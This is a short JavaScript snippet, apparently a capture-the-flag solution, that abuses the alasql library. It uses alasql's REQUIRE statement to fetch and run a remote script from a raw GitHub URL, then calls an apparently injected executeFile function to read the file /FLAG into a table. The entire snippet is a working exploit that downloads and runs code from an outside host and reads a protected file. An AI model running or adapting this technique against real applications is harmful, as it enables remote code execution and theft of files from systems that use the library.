const alasql = require('alasql');

alasql('REQUIRE "https://raw.githubusercontent.com/vr2/1/refs/heads/main/flag.js"');

alasql('CREATE TABLE woo (content TEXT)');
alasql.tables.woo.data = [
    {content:"test"}
];
alasql('INSERT INTO woo VALUES (executeFile("/FLAG"))');
